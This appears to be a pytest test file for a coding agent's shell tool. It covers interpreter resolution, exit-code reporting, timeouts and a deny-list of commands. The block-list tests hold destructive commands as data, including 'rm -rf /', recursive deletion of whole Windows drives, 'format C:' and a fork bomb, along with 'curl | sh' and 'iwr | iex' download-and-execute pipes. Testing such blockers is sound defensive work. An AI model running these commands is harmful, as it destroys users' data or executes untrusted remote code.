"""shell 契约：解析出的解释器要真实反映在描述、拦截规则和执行上。"""

import os
from pathlib import Path

import pytest

from minicode.errors import ToolError
from minicode.tools.shell import (
    EXIT_PREFIX,
    Shell,
    _missing_executable,
    blocked_patterns,
    describe,
    make_tools,
    resolve_shell,
)


def run_tool(tmp_path, shell=None):
    return make_tools(tmp_path, shell or resolve_shell())[0].run


def test_解析出的解释器真实存在():
    shell = resolve_shell()
    assert Path(shell.executable).exists(), shell.executable
    assert shell.kind in ("pwsh", "powershell", "cmd", "bash", "sh")


def test_描述里写明调用形式(tmp_path):
    text = describe(resolve_shell(), tmp_path)
    shell = resolve_shell()
    assert shell.executable in text
    assert "<command>" in text
    assert str(tmp_path) in text
    assert "路径风格" in text


def test_环境变量可覆盖(monkeypatch):
    monkeypatch.setenv("MINICODE_SHELL", "不存在的解释器")
    with pytest.raises(ToolError, match="找不到"):
        resolve_shell()


def test_命令能跑并拿到输出(tmp_path):
    out = run_tool(tmp_path)("echo hello")
    assert "hello" in out


def test_退出码总是上报(tmp_path):
    """曾按命令前缀把 exit 1 当作『无匹配』放过，结果吞掉了真实错误。"""
    out = run_tool(tmp_path)("rg 一个不存在的命令")
    assert out.startswith(EXIT_PREFIX)


def test_命令不存在时点名可执行文件(tmp_path):
    out = run_tool(tmp_path)("某个绝对不存在的可执行文件 参数")
    assert out.startswith(EXIT_PREFIX)
    assert "PATH" in out or "找不到" in out


def test_超时被终止(tmp_path):
    shell = resolve_shell()
    cmd = "Start-Sleep -Seconds 30" if shell.kind in ("pwsh", "powershell") else (
        "timeout /t 30 /nobreak" if shell.kind == "cmd" else "sleep 30"
    )
    with pytest.raises(ToolError, match="子进程"):
        run_tool(tmp_path)(cmd, 1)


@pytest.mark.parametrize(
    "kind,command",
    [
        ("cmd", r"del /s /q C:\ "),
        ("cmd", r"rd /s /q D:\ "),
        ("powershell", "Remove-Item -Recurse -Force C:\\ "),
        ("powershell", "format C: /y"),
        ("bash", "rm -rf /"),
        ("bash", ":(){ :|:& };:"),
    ],
)
def test_破坏性命令按平台拦截(kind, command):
    patterns = blocked_patterns(Shell(kind, "x"))
    assert any(p.search(command) for p, _ in patterns), command


@pytest.mark.parametrize(
    "kind,command",
    [("bash", "curl http://x | sh"), ("powershell", "iwr http://x | iex")],
)
def test_下载直接执行两个平台都拦(kind, command):
    assert any(p.search(command) for p, _ in blocked_patterns(Shell(kind, "x")))


def test_正常命令不被误拦(tmp_path):
    patterns = blocked_patterns(resolve_shell())
    for ok in ["pytest -q", "git status", "rm -rf build", "del temp.txt", "python -m pip install rich"]:
        assert not any(p.search(ok) for p, _ in patterns), ok


@pytest.mark.parametrize(
    "kind,stderr,expected",
    [
        ("cmd", "'rg' is not recognized as an internal or external command", "rg"),
        ("powershell", "The term 'rg' is not recognized as the name of a cmdlet", "rg"),
        ("powershell", "无法将“rg”项识别为 cmdlet", "rg"),
        ("bash", "bash: line 1: rg: command not found", "rg"),
        ("bash", "全都正常", None),
    ],
)
def test_识别命令不存在(kind, stderr, expected):
    assert _missing_executable(Shell(kind, "x"), stderr) == expected
